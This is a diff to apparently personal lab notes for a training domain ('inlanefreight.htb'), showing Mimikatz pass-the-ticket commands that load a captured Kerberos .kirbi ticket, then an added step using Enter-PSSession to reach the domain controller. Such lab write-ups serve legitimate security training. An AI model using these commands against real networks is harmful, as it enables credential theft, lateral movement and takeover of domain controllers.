@@ -57,7 +57,10 @@ Option 4) Lets use Mimikatz to pass the ticket using the kirbi ticket.
           mimikatz # privilege::debug
           mimikatz # kerberos::ptt "C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi"
 
- 
+ Note :- After running the above options we can access the DC with the powershell commands 
+          Step 1) Enter in to powershell from CMD by typing "powershell" 
+          Step 2) From powershell type the below command to get access to DC
+                    Enter-PSSession -ComputerName <DC name>
 
           
 
